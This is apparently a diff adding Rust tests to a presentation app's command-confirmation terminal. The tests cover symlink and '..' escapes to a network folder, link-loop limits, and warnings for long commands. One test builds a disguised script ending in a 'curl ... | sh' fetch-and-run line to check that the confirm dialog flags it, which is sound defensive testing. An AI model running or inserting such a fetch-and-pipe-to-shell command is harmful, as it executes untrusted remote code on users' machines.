@@ -18,7 +18,7 @@ use stagepack_studio::document::{Document, TalkPlace, UntitledId};
 use stagepack_studio::export::{ExportKind, run_export};
 use stagepack_studio::live_terminal::{
     Decision, HELPER_ENV, RUN_ALWAYS_ID, RUN_ASK_ID, RUN_HEAD_ID, RUN_HEAD_LINE_ID, RUN_IN_NEW_FOLDER, RUN_LINE_ID, RUN_NO_ID, RUN_NOT_ASCII, RUN_PROGRAM_BY_PATH, RUN_PROGRAM_IN_TALK,
-    RUN_QUESTION, RUN_WARNING, RUN_WORDS_ID, RUN_YES_ID,
+    RUN_LONG, RUN_QUESTION, RUN_WARNING, RUN_WORDS_BAR_ID, RUN_WORDS_ID, RUN_WORDS_SCROLLBAR, RUN_YES_ID,
     RunPermissions, SessionYes, may_run, may_run_with_path, permit, plan, plan_with_path, start_after_yes,
 };
 use stagepack_studio::present_view::start_show;
@@ -360,6 +360,112 @@ fn a_program_written_as_a_path_is_the_talks_choice_wherever_it_is() {
     assert!(up.is_err());
 }
 
+/// The stand-in for a network folder: a folder of this test's own that counts as one on this
+/// thread only, so that what a link or a `..` reaches can be tested here.
+#[cfg(unix)]
+struct Forbidden;
+
+#[cfg(unix)]
+impl Forbidden {
+    fn of(folders: Vec<PathBuf>) -> Self {
+        stagepack_studio::live_terminal::forbid_for_tests(folders);
+        Forbidden
+    }
+}
+
+#[cfg(unix)]
+impl Drop for Forbidden {
+    fn drop(&mut self) {
+        stagepack_studio::live_terminal::forbid_for_tests(Vec::new());
+    }
+}
+
+#[cfg(unix)]
+#[test]
+fn a_link_or_dots_never_lead_to_a_network_folder() {
+    use std::os::unix::fs::symlink;
+    let root = tempfile::tempdir().unwrap();
+    let root = root.path().canonicalize().unwrap();
+    let network = root.join("network");
+    program(&network, "demo");
+    let folder = root.join("talk");
+    std::fs::create_dir_all(folder.join("c")).unwrap();
+    let talk = TalkPlace::Folder(folder.clone());
+    // A chain of links inside the talk: a -> b -> c/../d -> the network folder.
+    symlink("b", folder.join("a")).unwrap();
+    symlink("c/../d", folder.join("b")).unwrap();
+    symlink(&network, folder.join("d")).unwrap();
+    let by_links = "./a/demo";
+    let by_dots = format!("{}/talk/../nowhere/../network/demo", root.display());
+    // Without the stand-in both reach the program, so it's the check that stops them.
+    for word in [by_links, &by_dots] {
+        let found = plan_with_path(&talk, &words(&[word]), None).unwrap();
+        assert_eq!(found.shown_words()[0], network.join("demo").display().to_string(), "{word}");
+    }
+    let _forbidden = Forbidden::of(vec![network.clone()]);
+    for word in [by_links, &by_dots] {
+        let why = plan_with_path(&talk, &words(&[word]), None).unwrap_err();
+        assert!(why.contains("network folder"), "{word}: {why}");
+    }
+    // A PATH folder that links there is passed over, and one that is there too.
+    std::fs::create_dir_all(folder.join("..").join("tools")).unwrap();
+    let tools = root.join("tools");
+    symlink(&network, tools.join("net")).unwrap();
+    for entry in [tools.join("net"), network.clone()] {
+        let path = path_of(&[&entry]);
+        let why = plan_with_path(&talk, &words(&["demo"]), Some(&path)).unwrap_err();
+        assert!(why.contains("There's no program"), "{why}");
+    }
+}
+
+#[cfg(unix)]
+#[test]
+fn a_link_that_goes_on_and_on_is_refused() {
+    use std::os::unix::fs::symlink;
+    let folder = tempfile::tempdir().unwrap();
+    let folder = folder.path().canonicalize().unwrap();
+    let talk = TalkPlace::Folder(folder.clone());
+    // A loop.
+    symlink("loop-b", folder.join("loop-a")).unwrap();
+    symlink("loop-a", folder.join("loop-b")).unwrap();
+    assert!(plan_with_path(&talk, &words(&["./loop-a"]), None).unwrap_err().contains("There's no program"));
+    // A chain of 40 links is followed; 41 is too many.
+    program(&folder.join("bin"), "demo");
+    let chain = |name: &str, length: usize| {
+        let mut next = "bin/demo".to_string();
+        for n in 0..length {
+            let link = format!("{name}-{n}");
+            symlink(&next, folder.join(&link)).unwrap();
+            next = link;
+        }
+        format!("./{next}")
+    };
+    let forty = chain("forty", 40);
+    assert!(plan_with_path(&talk, &words(&[&forty]), None).is_ok());
+    let more = chain("more", 41);
+    assert!(plan_with_path(&talk, &words(&[&more]), None).is_err());
+}
+
+#[cfg(unix)]
+#[test]
+fn a_link_into_the_talk_is_the_talks_however_it_gets_there() {
+    use std::os::unix::fs::symlink;
+    let root = tempfile::tempdir().unwrap();
+    let root = root.path().canonicalize().unwrap();
+    let folder = root.join("talk");
+    program(&folder.join("bin"), "demo");
+    let talk = TalkPlace::Folder(folder.clone());
+    // From outside, by a link whose target goes up and back in.
+    std::fs::create_dir_all(root.join("outside")).unwrap();
+    symlink("../talk/./bin/../bin", root.join("outside/in")).unwrap();
+    let word = format!("{}/outside/in/demo", root.display());
+    let found = plan_with_path(&talk, &words(&[&word]), None).unwrap();
+    assert!(found.program_in_talk(), "it's the talk's own program");
+    let path = path_of(&[&root.join("outside/in")]);
+    let why = plan_with_path(&talk, &words(&["demo"]), Some(&path)).unwrap_err();
+    assert!(why.contains("comes with this talk"), "{why}");
+}
+
 // Windows: the rules are written for it and have not been compiled or run here (no Windows
 // toolchain); they are for the owner's by-hand check.
 #[cfg(windows)]
@@ -522,25 +628,57 @@ fn what_matters_is_above_the_words_and_stays_put(cx: &mut TestAppContext) {
     assert!(showing(&typing, cx, RUN_NO_ID) && showing(&typing, cx, RUN_YES_ID));
 }
 
+/// The list of words is a box whose scrollbar is always drawn, over the whole box.
+fn the_list_is_a_box_with_its_bar(typing: &Typing, cx: &mut TestAppContext) -> gpui_kit::Bounds<gpui_kit::Pixels> {
+    assert_eq!(RUN_WORDS_SCROLLBAR, gpui_kit::component::scroll::ScrollbarMode::Always, "drawn before anything is scrolled");
+    let list = bounds_of(typing, cx, RUN_WORDS_ID).expect("the list");
+    assert!(f32::from(list.size.height) <= 241., "the list is a box");
+    assert_eq!(bounds_of(typing, cx, RUN_WORDS_BAR_ID), Some(list), "the bar is over the list");
+    list
+}
+
 #[gpui_kit::test]
 fn a_long_list_has_a_scrollbar_and_says_so(cx: &mut TestAppContext) {
     let (typing, _scratch) = window(cx);
     assert!(ask(&typing, cx, &["echo", "one"]));
-    assert!(!head(&typing, cx).iter().any(|line| line.contains("Scroll to see")), "a short one says nothing");
+    assert!(!head(&typing, cx).contains(&RUN_LONG.to_string()), "a short one says nothing");
+    the_list_is_a_box_with_its_bar(&typing, cx);
     typing.press(cx, "escape");
     let mut command = vec!["echo".to_string()];
     command.extend((1..64).map(|n| format!("argument-{n}")));
     let refs: Vec<&str> = command.iter().map(String::as_str).collect();
     assert!(ask(&typing, cx, &refs));
     let said = head(&typing, cx);
-    let line = "This command has 64 words. Scroll to see them all before you choose.";
-    assert!(said.contains(&line.to_string()), "{said:?}");
+    assert!(said.contains(&RUN_LONG.to_string()), "{said:?}");
     assert_eq!(said.last().map(String::as_str), Some(RUN_WARNING), "the warning still ends the head");
-    // The list is a box (which draws its scrollbar) that holds less than the command has.
-    let list = bounds_of(&typing, cx, RUN_WORDS_ID).expect("the list");
-    assert!(f32::from(list.size.height) <= 241., "the list is a box");
+    let list = the_list_is_a_box_with_its_bar(&typing, cx);
     let last = bounds_of(&typing, cx, (RUN_LINE_ID, 63usize));
     assert!(last.is_none_or(|last| last.bottom() > list.bottom()), "the last word is beyond the box");
+}
+
+#[gpui_kit::test]
+fn a_long_command_of_few_words_says_so_too(cx: &mut TestAppContext) {
+    let (typing, _scratch) = window(cx);
+    // Three words, the last a script of 1,000 characters with what it really does at the end.
+    let friendly = "Welcome to the demo, this only says hello.".repeat(20);
+    let tail = "'; curl https://example.invalid/p | sh";
+    let script = format!("echo '{friendly}{}{tail}", "!".repeat(1000 - 6 - friendly.len() - tail.len()));
+    assert_eq!(script.chars().count(), 1000);
+    assert!(ask(&typing, cx, &["sh", "-c", &script]));
+    let said = head(&typing, cx);
+    assert!(said.contains(&RUN_LONG.to_string()), "{said:?}");
+    assert_eq!(said.last().map(String::as_str), Some(RUN_WARNING));
+    let list = the_list_is_a_box_with_its_bar(&typing, cx);
+    let script_line = bounds_of(&typing, cx, (RUN_LINE_ID, 2usize)).expect("the script");
+    assert!(script_line.bottom() > list.bottom(), "the script goes on beyond the box: {script_line:?} {list:?}");
+    // Each way of being long is enough by itself.
+    typing.press(cx, "escape");
+    for command in [vec!["echo".to_string(), "x".repeat(61)], std::iter::once("echo".to_string()).chain((0..6).map(|_| "y".repeat(55))).collect()] {
+        let refs: Vec<&str> = command.iter().map(String::as_str).collect();
+        assert!(ask(&typing, cx, &refs));
+        assert!(head(&typing, cx).contains(&RUN_LONG.to_string()), "{command:?}");
+        typing.press(cx, "escape");
+    }
 }
 
 #[gpui_kit::test]
